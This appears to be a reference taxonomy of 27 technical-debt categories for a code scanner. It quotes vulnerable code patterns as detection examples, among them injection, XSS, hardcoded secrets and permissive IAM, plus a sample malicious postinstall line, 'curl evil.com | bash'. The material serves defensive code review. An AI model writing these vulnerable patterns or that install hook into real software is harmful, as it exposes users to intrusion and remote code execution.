# Complete Tech Debt Taxonomy (27 Categories)

## Overview

This taxonomy organizes technical debt into three major domains, each with nine categories. Every category has specific detection patterns, severity levels, and remediation approaches.

---

## Security Debt (Categories 1-9)

### 1. Injection Vulnerabilities

**What's Detected:**
- SQL injection via string concatenation or template literals
- XSS via innerHTML, document.write, dangerouslySetInnerHTML
- Command injection via exec/spawn with user input
- LDAP injection in directory queries
- NoSQL injection in MongoDB/DynamoDB queries
- XXE in XML parsers without entity restrictions
- SSRF via user-controlled URLs in fetch/axios/request
- Path traversal via unsanitized file paths

**Severity:** CRITICAL

**Detection Patterns:**
```javascript
// SQL Injection
query(`SELECT * FROM users WHERE id = ${userId}`)
db.raw('SELECT * FROM users WHERE name = ' + name)

// XSS
element.innerHTML = userInput
document.write(untrustedData)
<div dangerouslySetInnerHTML={{__html: userContent}} />

// Command Injection
exec(`ls ${userDir}`)
spawn('bash', ['-c', userCommand], {shell: true})

// SSRF
fetch(req.body.url)
axios.get(userProvidedUrl)

// Path Traversal
fs.readFileSync(userProvidedPath)
path.join(baseDir, '../' + userPath)
```

### 2. Cryptographic Weaknesses

**What's Detected:**
- Weak hashing: MD5, SHA1 for passwords
- Hardcoded encryption keys and secrets
- Math.random() used for security tokens
- Missing bcrypt/argon2 for password storage
- Insufficient key lengths
- Deprecated crypto algorithms (DES, RC4)

**Severity:** HIGH to CRITICAL

**Detection Patterns:**
```javascript
// Weak hashing
crypto.createHash('md5').update(password)
hashlib.sha1(password.encode())

// Insecure RNG
const token = Math.random().toString(36)
const sessionId = `session_${Math.random()}`

// Hardcoded keys
const SECRET_KEY = 'my-super-secret-key'
const JWT_SECRET = 'jwt-secret-123'
```

### 3. Session Management

**What's Detected:**
- Session fixation vulnerabilities
- Insecure storage (localStorage for tokens)
- Missing HttpOnly/Secure/SameSite on cookies
- No session timeout
- Predictable session IDs

**Severity:** HIGH

**Detection Patterns:**
```javascript
// Insecure storage
localStorage.setItem('authToken', token)
sessionStorage.setItem('jwt', jwt)

// Missing cookie flags
res.cookie('session', id) // no options
document.cookie = `token=${jwt}` // accessible to JS

// No regeneration after login
req.session.userId = user.id // without regenerating
```

### 4. Auth/AuthZ Gaps

**What's Detected:**
- Missing auth middleware on routes
- IDOR (Insecure Direct Object References)
- JWT vulnerabilities (alg:none, weak secrets)
- Privilege escalation patterns
- Broken access control

**Severity:** CRITICAL

**Detection Patterns:**
```javascript
// Missing auth
app.get('/api/users/:id', (req, res) => {...}) // no middleware

// IDOR
const doc = await Document.findById(req.params.id) // no owner check
await Order.deleteOne({_id: orderId}) // no user verification

// JWT vulnerabilities
jwt.verify(token, secret, {algorithms: ['none', 'HS256']})
const decoded = jwt.decode(token) // without verify
```

### 5. Security Headers

**What's Detected:**
- Missing or misconfigured CORS
- No Content-Security-Policy
- Missing HSTS
- Missing X-Frame-Options
- Permissive referrer policy

**Severity:** MEDIUM to HIGH

**Detection Patterns:**
```javascript
// Overly permissive CORS
cors({origin: '*'})
res.header('Access-Control-Allow-Origin', '*')

// Missing headers
app.use(helmet()) // missing specific configs
// No CSP configuration
// No X-Frame-Options
```

### 6. Supply Chain

**What's Detected:**
- Typosquatting packages (lodahs vs lodash)
- Vulnerable dependencies (known CVEs)
- Dependency confusion attacks
- Malicious postinstall scripts
- Lockfile integrity issues
- Floating versions (*, latest, >=)

**Severity:** HIGH to CRITICAL

**Detection Patterns:**
```json
// Floating versions
"dependencies": {
  "express": "*",
  "lodash": ">=4.0.0",
  "axios": "latest"
}

// Missing lockfile
// No package-lock.json or yarn.lock

// Suspicious scripts
"scripts": {
  "postinstall": "curl evil.com | bash"
}
```

### 7. Secrets Management

**What's Detected:**
- Hardcoded secrets in source code
- Secrets in logs
- Missing rotation mechanisms
- Secrets in build artifacts
- Secrets in error messages

**Severity:** CRITICAL

**Detection Patterns:**
```javascript
// Hardcoded secrets
const API_KEY = 'sk-live-abc123'
const DB_PASSWORD = 'production_password'

// Secrets in logs
console.log('Auth failed:', {password: req.body.password})
logger.info('API call', {apiKey: config.apiKey})

// Secrets in errors
throw new Error(`DB connection failed: ${connectionString}`)
```

### 8. Data Privacy

**What's Detected:**
- PII exposure in logs/errors
- GDPR compliance gaps
- Missing encryption for sensitive data
- Sensitive data in URLs
- Unmasked data in responses

**Severity:** HIGH to CRITICAL

**Detection Patterns:**
```javascript
// PII in logs
logger.info('User registered', {email, ssn, creditCard})

// Sensitive data in URL
router.get('/user/:ssn/details')
fetch(`/api/search?creditCard=${cc}`)

// Missing encryption
await User.create({ssn: ssn}) // stored in plaintext
```

### 9. Infrastructure Security

**What's Detected:**
- IaC misconfigurations (Terraform, CloudFormation)
- Overly permissive IAM policies
- Public S3 buckets
- Container security (root user, privileged mode)
- Missing network policies

**Severity:** HIGH to CRITICAL

**Detection Patterns:**
```hcl
// Overly permissive IAM
resource "aws_iam_policy" {
  policy = jsonencode({
    Action = ["*"]
    Resource = ["*"]
  })
}

// Public S3
resource "aws_s3_bucket_acl" {
  acl = "public-read"
}
```

```dockerfile
# Container as root
FROM node:18
USER root  # or no USER directive
```

---

## Operational Debt (Categories 10-18)

### 10. Observability

**What's Detected:**
- Logging gaps (functions without logging)
- Unstructured logs
- Missing correlation IDs
- Metrics instrumentation gaps
- Distributed tracing gaps
- Sensitive data in logs

**Severity:** MEDIUM to HIGH

**Detection Patterns:**
```javascript
// Unstructured logging
console.log('Error occurred: ' + error)

// Missing correlation ID
app.use((req, res, next) => {
  // No req.id or correlation header
  next()
})

// No metrics
async function handleRequest() {
  // No timing, counting, or histogram
}
```

### 11. Resilience

**What's Detected:**
- Missing timeouts on HTTP/DB calls
- Retries without exponential backoff
- No circuit breakers
- Missing fallbacks
- No bulkhead isolation

**Severity:** HIGH

**Detection Patterns:**
```javascript
// No timeout
await axios.get(url) // no timeout config
await db.query(sql) // no query timeout

// Bad retry
for (let i = 0; i < 3; i++) {
  try { return await api.call() }
  catch { await sleep(1000) } // linear, no jitter
}

// No circuit breaker
async function callExternalService() {
  return await fetch(url) // direct call, no protection
}
```

### 12. Deployment

**What's Detected:**
- No rollback capability
- Missing feature flags
- Irreversible migrations
- No zero-downtime deployment support
- Big bang releases

**Severity:** MEDIUM to HIGH

**Detection Patterns:**
```javascript
// Irreversible migration
exports.up = async (db) => {
  await db.dropColumn('users', 'legacy_id')
  // No corresponding down migration
}

// No feature flags
if (newFeatureEnabled) // hardcoded boolean
```

### 13. Configuration

**What's Detected:**
- Hardcoded configuration values
- Environment-specific code (if prod/staging)
- Secret management gaps
- Configuration drift
- Missing validation

**Severity:** MEDIUM to HIGH

**Detection Patterns:**
```javascript
// Hardcoded config
const API_URL = 'https://api.production.com'
const MAX_RETRIES = 3

// Environment-specific code
if (process.env.NODE_ENV === 'production') {
  // Different logic paths
}
```

### 14. SLO/Reliability

**What's Detected:**
- Missing SLIs (latency, error rate, availability)
- No defined SLOs
- Missing error budgets
- Shallow health checks
- No chaos testing setup

**Severity:** MEDIUM

**Detection Patterns:**
```javascript
// Shallow health check
app.get('/health', (req, res) => res.send('ok'))
// No dependency checks, no detailed status

// No SLI tracking
// Missing latency percentiles (p50, p95, p99)
// No error rate calculation
```

### 15. Alerting

**What's Detected:**
- Alerts without runbooks
- Alert fatigue (too many low-priority alerts)
- Missing critical alerts
- Unclear ownership
- No escalation paths

**Severity:** MEDIUM

**Detection Patterns:**
```yaml
# Alert without runbook
- alert: HighErrorRate
  expr: error_rate > 0.05
  # Missing: runbook_url, team, escalation
```

### 16. Runbooks

**What's Detected:**
- Missing operational documentation
- Stale runbooks (outdated procedures)
- Incomplete escalation paths
- No incident templates

**Severity:** LOW to MEDIUM

### 17. Build/CI

**What's Detected:**
- Slow builds (>10 min)
- Flaky tests
- Missing quality gates
- Artifact bloat
- Pipeline timeouts
- No caching strategy

**Severity:** MEDIUM

**Detection Patterns:**
```yaml
# Missing quality gates
jobs:
  build:
    steps:
      - run: npm test
      # No coverage check
      # No lint
      # No security scan
```

### 18. Rate Limiting

**What's Detected:**
- Missing rate limits on auth endpoints
- No rate limiting on APIs
- Brute force exposure
- Resource exhaustion vectors

**Severity:** HIGH

**Detection Patterns:**
```javascript
// No rate limiting
app.post('/login', loginHandler) // no rate limiter
app.post('/api/send-email', sendEmail) // abuse vector
```

---

## Architectural Debt (Categories 19-27)

### 19. SOLID Violations

**What's Detected:**
- Single Responsibility: classes with >20 methods, multiple domains
- Open/Closed: excessive type guards, modifying base classes
- Liskov Substitution: overrides that change behavior contracts
- Interface Segregation: fat interfaces forcing unused implementations
- Dependency Inversion: concrete dependencies, new in business logic

**Severity:** MEDIUM to HIGH

**Detection Patterns:**
```javascript
// SRP violation
class UserService {
  createUser() {}
  sendEmail() {}
  generateReport() {}
  processPayment() {}
  // 20+ unrelated methods
}

// DIP violation
class OrderService {
  constructor() {
    this.db = new PostgresDatabase() // concrete
    this.emailer = new SendGridEmailer() // concrete
  }
}
```

### 20. Coupling/Cohesion

**What's Detected:**
- High Afferent Coupling (Ca): many dependents
- High Efferent Coupling (Ce): many dependencies
- High Instability Index: Ce / (Ca + Ce)
- Low Cohesion (LCOM): methods not sharing state
- Module boundary violations

**Severity:** MEDIUM to HIGH

**Metrics:**
- Ca > 20: Too many dependents, hard to change
- Ce > 10: Too many dependencies, fragile
- LCOM > 0.8: Low cohesion, should split
- Instability > 0.8 depending on stable modules: Architecture violation

### 21. Design Anti-Patterns

**What's Detected:**
- God Object: >500 lines or >20 methods
- Anemic Domain Model: DTOs with no behavior
- Feature Envy: methods using more external data
- Primitive Obsession: domain concepts as primitives
- Shotgun Surgery: changes scattered across files
- Poltergeist: classes that only delegate

**Severity:** MEDIUM

### 22. Domain Model

**What's Detected:**
- Bounded context bleeding
- Missing anti-corruption layers
- Aggregate violations
- Naming drift from ubiquitous language
- Domain logic in application layer

**Severity:** MEDIUM to HIGH

### 23. API Contract

**What's Detected:**
- Breaking changes without versioning
- Missing deprecation notices
- No contract testing
- Inconsistent error formats
- Missing documentation

**Severity:** HIGH

### 24. Schema Evolution

**What's Detected:**
- Migration gaps
- Backward-incompatible changes
- Orphaned columns
- Missing indexes
- Constraint violations

**Severity:** MEDIUM to HIGH

### 25. Distributed Systems

**What's Detected:**
- Distributed monolith patterns
- Chatty services (N+1 across network)
- Missing saga compensation
- Data consistency gaps
- Synchronous chains

**Severity:** HIGH

### 26. Event/Async

**What's Detected:**
- Event schema versioning issues
- Missing saga compensation
- Eventual consistency bugs
- DLQ handling gaps
- Command/query separation violations

**Severity:** MEDIUM to HIGH

### 27. Legacy Integration

**What's Detected:**
- Missing adapters/facades
- Strangler fig violations
- Tech stack fragmentation
- Abandoned feature flags
- Deprecated API usage

**Severity:** MEDIUM

---

## Severity Levels

| Level | Impact | Response Time |
|-------|--------|---------------|
| CRITICAL | Exploitable security, data loss | Immediate |
| HIGH | Significant risk, reliability impact | This sprint |
| MEDIUM | Maintainability, moderate risk | Next 2-4 weeks |
| LOW | Code quality, minor issues | Backlog |

---

## Cross-References

- See `roi-framework.md` for prioritization methodology
- See `remediation-sequences.md` for safe fix ordering
- See `validation-gates.md` for verification checklists
